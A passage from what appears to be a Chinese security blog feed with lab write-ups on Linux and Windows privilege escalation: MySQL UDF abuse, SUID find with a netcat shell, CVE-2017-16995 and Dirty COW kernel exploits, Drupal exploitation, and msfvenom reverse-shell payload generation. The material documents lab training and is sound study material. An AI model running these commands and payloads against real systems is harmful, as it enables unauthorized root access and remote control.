src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625182318246.png" alt="image-20220625182318246"></p><p>上传一句话使用蚁剑连接：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625182503883.png" alt="image-20220625182503883"></p><p>进入 &#x2F;tmp目录上传脚本，赋予权限后执行：</p><p>!<img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625182937039.png" alt="image-20220625182937039"></p><p>搜集到mysql数据库版本为5.5.6，可以使用UDF提权。</p><p>（上一步为了连接数据库也是为了查看版本信息）</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625183508212.png" alt="image-20220625183508212"></p><h3 id="0x10-1"><a href="#0x10-1" class="headerlink" title="0x10"></a>0x10</h3><p>使用<code>searchsploit mysql</code> 命令找到利用exp：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625184406346.png" alt="image-20220625184406346"></p><p>UDF提权，1518.c</p><p>把该文件复制出来，在kali上进行编译生成so文件：</p><blockquote><p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;1518.c .&#x2F;<br>gcc -g -c 1518.c<br>gcc -g -shared -o  raptor_udf.so 1518.o -lc</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625184648868.png" alt="image-20220625184648868"></p><h3 id="0x11-1"><a href="#0x11-1" class="headerlink" title="0x11"></a>0x11</h3><blockquote><p>在kali上起一个web服务，将生成的so文件提供给靶机下载</p><p>python -m SimpleHTTPServer 8888</p></blockquote><blockquote><p>在受害靶机上切换到tmp目录下，wget下载编译好的so文件</p><p>cd &#x2F;tmp<br>wget <a href="http://192.168.216.150:8888/raptor_udf.so">http://192.168.216.150:8888/raptor_udf.so</a></p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625185310993.png" alt="image-20220625185310993"></p><p>拒绝连接。</p><p>将编译好的raptor_udf.so文件使用蚁剑上传至受害机&#x2F;tmp目录：</p><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625190720075.png" alt="image-20220625190720075"></p><p>将raptor_udf.so文件重命名为1518.so文件：<br><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625190903411.png" alt="image-20220625190903411"></p><h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><p>环境崩了，简述一下后续过程：</p><p>之后进入数据库创建表foo，向表中插入二进制数据，然后利用dumpfile函数把文件导出， 再新建存储函数do_system类型是integer，别名（soname）文件名字</p><blockquote><p>mysql -u root -pR@v3nSecurity<br>use mysql;<br>create table foo(line blob);<br>insert into foo values(load_file(‘&#x2F;tmp&#x2F;raptor_udf.so’));<br>select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;raptor_udf.so’;<br>create function do_system returns integer soname ‘raptor_udf.so’;<br>select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;raptor_udf.so’;<br>create function do_system returns integer soname ‘raptor_udf.so’;</p></blockquote><p>通过do_system函数给find命令所有者的suid权限，使其可以执行root权限的命令</p><blockquote><p>select do_system(‘chmod u+s &#x2F;usr&#x2F;bin&#x2F;find’);</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625193426395.png" alt="image-20220625193426395"></p><blockquote><p>touch finn<br>find finn -exec “bin&#x2F;sh” ;</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625193445459.png" alt="image-20220625193445459"></p><p>使用find执行 shell，最后找到flag4</p><blockquote><p>find &#x2F;root -name flag*</p></blockquote><p><img src="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/image-20220625193513507.png" alt="image-20220625193513507"></p><h3 id="0x13-总结"><a href="#0x13-总结" class="headerlink" title="0x13 总结"></a>0x13 总结</h3><p><strong>需要利用数据库将UDF进行导出的原因：</strong></p><p>只有借助MySQL才有root权限，才能刚1518.so导入到&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;1518.so（普通用户没有这个权限），也只有mysql的才能够赋予用户suid权限。</p><h2 id="0x03-Linux-提权简单总结归类"><a href="#0x03-Linux-提权简单总结归类" class="headerlink" title="0x03  Linux 提权简单总结归类"></a>0x03  Linux 提权简单总结归类</h2><p>1.提权环境，信息收集(SUID,定时任务,可能漏洞，第三方服务应用等)</p><p>2.最新相关漏洞要明确(关注点)，二次开发相关脚本学会展望(四个脚本)</p><p>3.本地 searchsploit 脚本及远程 exploitdb 站点搜索说明（简要使用）</p><p>4.其他提权方法如：密码复用，guid，sudo 等说明(运气，同理，鸡肋等)</p><p>SUDO 说明参考：<a href="https://www.freebuf.com/vuls/217089.html">https://www.freebuf.com/vuls/217089.html</a></p><p>exploitdb 站点：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><p>Linux漏洞库：<a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a> </p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-Linux提权1</title>
      <link href="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/"/>
      <url>/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/Linux%E6%8F%90%E6%9D%83.png" alt="Linux提权"></p><h2 id="0x01-信息收集LinEnum、linuxprivchecker脚本"><a href="#0x01-信息收集LinEnum、linuxprivchecker脚本" class="headerlink" title="0x01 信息收集LinEnum、linuxprivchecker脚本"></a>0x01 信息收集LinEnum、linuxprivchecker脚本</h2><h3 id="0x00-LinEnum"><a href="#0x00-LinEnum" class="headerlink" title="0x00 LinEnum"></a>0x00 LinEnum</h3><p>需要通过webshell权限或文件上传权限上传“LinEnum.sh”到“tmp”文件夹下。</p><p>（tmp目录是linux临时目录，可读写可执行，若是上传其他目录有可能当前权限不够导致上传失败或者执行不了，linux提权优先上传tmp目录）</p><p>来到“tmp”目录下</p><pre><code>cd /tmp</code></pre><p>如果文件不能被执行，给予其一个可执行权限</p><pre><code>chmod +x LinEnum.shchmod +x [文件名]</code></pre><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624101007086.png" alt="image-20220624101007086"></p><p>执行文件</p><pre><code>./LinEnum.sh./[文件名]</code></pre><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624101307425.png" alt="image-20220624101307425"></p><p>通过信息搜集可以查看是否窜在SUID提权的可能，或者可以利用的其他信息。</p><h3 id="0x01-linuxprivchecker"><a href="#0x01-linuxprivchecker" class="headerlink" title="0x01 linuxprivchecker"></a>0x01 linuxprivchecker</h3><p>需要通过webshell权限或文件上传权限上传“linuxprivchecker.py”到“tmp”文件夹下，还需要目标机器上有python环境。</p><p>来到“tmp”目录下，执行文件</p><pre><code>python linuxprivchecker.py</code></pre><p>linuxprivchecker会列出目标机器的信息。</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624101608291.png" alt="image-20220624101608291"></p><p>由于是python脚本，靶机没有安装python环境，导致执行不了。命令执行如图。</p><h2 id="0x02-漏洞探针linux-exploit-suggester1-2脚本"><a href="#0x02-漏洞探针linux-exploit-suggester1-2脚本" class="headerlink" title="0x02 漏洞探针linux-exploit-suggester1-2脚本"></a>0x02 漏洞探针linux-exploit-suggester1-2脚本</h2><h3 id="0x00-linux-exploit-suggester"><a href="#0x00-linux-exploit-suggester" class="headerlink" title="0x00 linux-exploit-suggester"></a>0x00 linux-exploit-suggester</h3><p>需要通过webshell权限或文件上传权限上传“linux-exploit-suggester.sh”到“tmp”文件夹下</p><p>来到“tmp”目录下，执行文件</p><pre><code>./linux-exploit-suggester.sh</code></pre><p>linux-exploit-suggester首先会输出内核等信息，然后输出可能存在的漏洞，包括exp的下载地址，可以下载对应的exp来测试。</p><h3 id="0x01-linux-exploit-suggester2"><a href="#0x01-linux-exploit-suggester2" class="headerlink" title="0x01 linux-exploit-suggester2"></a>0x01 linux-exploit-suggester2</h3><p>需要通过webshell权限或文件上传权限上传“linux-exploit-suggester-2.pl”到“tmp”文件夹下，还需要目标机器上有perl环境</p><p>来到“tmp”目录下，执行文件</p><pre><code>perl linux-exploit-suggester-2.pl</code></pre><p>linux-exploit-suggester2会直接报告可能的漏洞和exp下载地址。</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624094314803.png" alt="image-20220624094314803"></p><h2 id="0x03-SUID"><a href="#0x03-SUID" class="headerlink" title="0x03 SUID"></a>0x03 SUID</h2><p>###0x00 介绍</p><p>SUID (Set UID)是Linux中的一种特殊权限,其功能是用户在运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件。</p><pre><code>    在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件ls,其属主为root,当我们通过非root用户登录时,如果ls设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限.，利用此特性,我们可通过SUID进行提权。</code></pre><h3 id="0x01-设置和取消SUID"><a href="#0x01-设置和取消SUID" class="headerlink" title="0x01 设置和取消SUID"></a>0x01 设置和取消SUID</h3><blockquote><p>查看可执行文件是否有suid权限：<br>ls -alh 文件名</p></blockquote><blockquote><p>设置suid权限：</p><p>chmod u+s 可执行文件</p></blockquote><blockquote><p>取消suid权限：</p><p>chmod u-s 可执行文件</p></blockquote><h2 id="0x04-SUID进行Linux提权"><a href="#0x04-SUID进行Linux提权" class="headerlink" title="0x04  SUID进行Linux提权"></a>0x04  SUID进行Linux提权</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>利用LinEnum.sh搜集SUID相关信息：</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624103714316.png" alt="image-20220624103714316"></p><p>寻找这几个关键字具有SUID权限的二进制可执行文件提权：</p><pre class="line-numbers language-none"><code class="language-none">Nmap，Vim，find，Bash，More，Less，Nano，cp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者利用手工探针：</p><p>原理：<br>这个命令将从&#x2F;目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到&#x2F;dev&#x2F;null，从而仅列出该用户具有访问权限的那些二进制文件。</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null （适用Ubuntu）find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624104448920.png" alt="image-20220624104448920"></p><p>可以看到没有可利用的文件。</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>将&#x2F;usr&#x2F;bin目录下，将find文件以root赋予suid权限：</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624105237895.png" alt="image-20220624105237895"></p><p>再利用手工探针：<br><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624105342840.png" alt="image-20220624105342840"></p><p>可以看到有find文件。</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>（没有环境，搭建失败了）</p><p>之后使用冰蝎连接，然后利用MSF连接冰蝎反弹的shell；</p><p>再执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">touch test-find test -exec whoami \; #查看返回的当前权限；（原理：find test文件，并且以find文件的权限执行：whoami命令，如果find是suid,普通用户执行find命令也会获得root权限，再执行whoami就是root）find test -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \; #nc(netcat) 反弹 shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>参考文章：<br><a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p><h2 id="0x05-Linux本地内核漏洞提权"><a href="#0x05-Linux本地内核漏洞提权" class="headerlink" title="0x05 Linux本地内核漏洞提权"></a>0x05 Linux本地内核漏洞提权</h2><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p>靶机：墨者学院 Ubuntu 16.04漏洞复现(CVE-2017-16995)</p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>先使用ssh连接靶机：</p><blockquote><p>ssh -p 端口号 linux服务器用户名@linux服务器ip地址</p></blockquote><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624083730603.png" alt="image-20220624083730603"></p><p>查看id，普通用户<br><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624083840869.png" alt="image-20220624083840869"></p><blockquote><p>1、ID&#x3D;0<br>当 UID 是 0 时，代表这个账号是『系统管理员』！当你要创建一个账户为另一个系统管理员账号时， 你可以将该账号的 UID 改成 0 即可；这也就是说，一部系统上面的系统管理员不一定只有 root ！ 但强烈建议避免多个账号的 UID 配置为 0 。</p><p>2、ID&#x3D;1<del>499（系统使用）<br>该范围内的用户id是保留给系统使用的 ID，其实 1</del>65534 之间的账号并没有不同， 也就是除了 0 之外，其它的 UID 并没有不一样，预设 500 以下给系统作为保留账号只是一个习惯。这样的好处是，以有名的 DNS 服务器的启动服务『 named 』为例，这个程序的预设所有人 named 的账号 UID 是 25 ，当你自定义的账号也是 25 时，会造成系统冲突！为了杜绝这样的问题，养成好习惯，保留 500 以前的 UID 给系统使用！</p><p>注： 一般来说， 1到99 会保留给系统预设的账号，另外 100~499 则保留给一些服务来使用。</p><p>3、ID&#x3D;500~65535 给一般使用者用的。</p></blockquote><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>上传漏洞探针脚本进行检测：</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624094201185.png" alt="image-20220624094201185"></p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624094314803.png" alt="image-20220624094314803"></p><p>可以看到探测出三个可利用漏洞；CVE-2017-16995也存在。</p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>下载CVE-2017-16995EXP：<br><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624094633461.png" alt="image-20220624094633461"></p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624094653824.png" alt="image-20220624094653824"></p><p>将45010.c文件上传至靶机：<br><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624094814591.png" alt="image-20220624094814591"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>由于c文件，需要编译运行：<br><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624095010262.png" alt="image-20220624095010262"></p><p>执行文件发现权限不够，修改权限：</p><blockquote><p>chomd +x 45010.c</p></blockquote><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624095135941.png" alt="image-20220624095135941"></p><blockquote><p>使用以下命令先编译：<br>gcc 45010.c -o 45010</p><p>再执行：</p><p>.&#x2F;45010</p></blockquote><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624095517115.png" alt="image-20220624095517115"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>查看当前权限：</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624095554777.png" alt="image-20220624095554777"></p><p>可以看到成功提权。</p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>这个时候访问root目录下的key.txt文件得到key值：<br><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624100331322.png" alt="image-20220624100331322"></p><h2 id="0x06-脏牛Linux内核提权"><a href="#0x06-脏牛Linux内核提权" class="headerlink" title="0x06 脏牛Linux内核提权"></a>0x06 脏牛Linux内核提权</h2><h3 id="0x00-3"><a href="#0x00-3" class="headerlink" title="0x00"></a>0x00</h3><p>靶机：vulnhub-Lampiao</p><p>攻击机：Kali</p><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p>namp扫一下网段：</p><pre class="line-numbers language-none"><code class="language-none">nmap x.x.x.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624200236287.png" alt="image-20220624200236287"></p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624200211257.png" alt="image-20220624200211257"></p><p>可以看到192.168.216.151这个主机存在80端口。</p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>访问这个web服务：</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624200422897.png" alt="image-20220624200422897"></p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624200413371.png" alt="image-20220624200413371"></p><p>没有什么关键信息。</p><h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><p>再使用nmap针对这个主机扫描所有端口：</p><pre class="line-numbers language-none"><code class="language-none">nmap -p1-65535 192.168.216.151<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624200803493.png" alt="image-20220624200803493"></p><p>又扫到一个1898端口开放的服务，直接访问。</p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624200848384.png" alt="image-20220624200848384"></p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624200856765.png" alt="image-20220624200856765"></p><p>是一个web服务。</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624200949207.png" alt="image-20220624200949207"></p><p>页底有一个Powered by Drupal，猜测是一个cms，网上直接搜。</p><h3 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h3><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624201111502.png" alt="image-20220624201111502"></p><h3 id="0x06-1"><a href="#0x06-1" class="headerlink" title="0x06"></a>0x06</h3><p>这里直接使用MSF搜索相关漏洞：</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624201357307.png" alt="image-20220624201357307"></p><p>直接使用2018年最新的exploit进行漏洞利用，设置攻击ip和对应端口，</p><p>（2019年漏洞显示normal不可利用）</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624202340135.png" alt="image-20220624202340135"></p><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>返回会话成功：<br><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624202419183.png" alt="image-20220624202419183"></p><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>查看权限为普通权限：</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624202457991.png" alt="image-20220624202457991"></p><p>使用漏洞探针脚本上传到靶机进行探针：</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624203945287.png" alt="image-20220624203945287"></p><p>可以看到没有执行权限，添加权限后执行脚本：</p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624204100119.png" alt="image-20220624204100119"></p><p>这里没有给出脏牛漏洞。</p><p>直接下载脏牛漏洞：</p><blockquote><p>下载地址：<a href="http://www.exploit-db.com/download/40611">http://www.exploit-db.com/download/40611</a></p></blockquote><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624204557669.png" alt="image-20220624204557669"></p><p>这里下载完是一个文件，不是c文件，需要重命名或者从本地上传至靶机。</p><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>本地下载好40611.cpp文件上传至靶机：<br><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624210315111.png" alt="image-20220624210315111"></p><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><blockquote><p>使用以下命令编译：<br>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow 40611.cpp -lutil</p></blockquote><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624210640766.png" alt="image-20220624210640766"></p><p>编译出dcow这个文件。</p><h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><p>这里漏洞若要利用必须开一个模拟终端，这是漏洞成因造成的。因为产生一个交互式shell，就比如shell输入密码需要交互是一个道理。这里使用python产生一个伪终端。</p><blockquote><p>产生交互式命令：<br>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p></blockquote><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624210653315.png" alt="image-20220624210653315"></p><p>这里获取到了root的密码（不是真正的修改，而是临时copy的一个root权限 )。</p><h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><p>root登录在&#x2F;root目录下获取flag(这里可以以root创建一个新用户，加入root用户组，然后登录靶机) </p><p><img src="/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/image-20220624210740592.png" alt="image-20220624210740592"></p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-windows提权2</title>
      <link href="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/"/>
      <url>/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-RottenPotato-烂土豆-配合令牌窃取提权"><a href="#0x00-RottenPotato-烂土豆-配合令牌窃取提权" class="headerlink" title="0x00 RottenPotato(烂土豆)配合令牌窃取提权"></a>0x00 RottenPotato(烂土豆)配合令牌窃取提权</h2><h3 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h3><p>1.欺骗“NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</p><p>2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</p><p>3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</p><p>总结：一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。</p><h3 id="0x01-烂土豆比热土豆的优点"><a href="#0x01-烂土豆比热土豆的优点" class="headerlink" title="0x01 烂土豆比热土豆的优点"></a>0x01 烂土豆比热土豆的优点</h3><p>1.100%可靠</p><p>2.（当时）全版本通杀</p><p>3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用</p><p>总之，烂土豆是通过中间人攻击，将COM(NT\SYSTEM权限)在第二步挑战应答过程中认证的区块改为自己的区块获取SYSTEM权限，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p><h3 id="0x02-适用范围"><a href="#0x02-适用范围" class="headerlink" title="0x02 适用范围"></a>0x02 适用范围</h3><p>1、本地提权，只针对本地用户。</p><p>2、适用于win7、8、10、2008、2012</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>流程：上传烂土豆-执行烂土豆-利用窃取模块-窃取 SYSTEM-成功</p><p>（前提：已经获得webshell权限）</p><p>使用msf生成一个后门：</p><blockquote><p>格式：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your ip address> LPORT&#x3D;<Your port to connect on> -f exe &gt; 路径&#x2F;shell.exe</Your></Your></p></blockquote><pre class="line-numbers language-none"><code class="language-none">命令：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.216.150 lport&#x3D;5588 -f exe -o &#x2F;home&#x2F;xiaobai&#x2F;payload.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622220855245.png" alt="image-20220622220855245"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>此时的权限是iusr：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622214231489.png" alt="image-20220622214231489"></p><p>使用蚁剑将后门传上去：</p><p><img 